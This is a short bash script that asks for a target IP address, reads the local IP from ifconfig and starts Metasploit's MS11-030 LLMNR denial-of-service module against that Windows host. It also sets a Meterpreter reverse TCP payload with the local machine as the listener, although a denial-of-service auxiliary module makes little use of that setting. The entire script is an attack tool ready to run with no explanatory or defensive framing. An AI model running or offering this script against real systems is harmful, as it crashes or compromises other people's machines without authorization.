echo "Enter IP of Remote Host"
read varhost

i=ifconfig

g=$($i | grep "inet " | grep -v "127" | sed 's/inet//g' | sed 's/  netmask 255.255.255.0  broadcast *.*.*.*//g')

msfconsole -x "use auxiliary/dos/windows/llmnr/ms11_030_dnsapi ;set RHOST $varhost; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $g;run" 
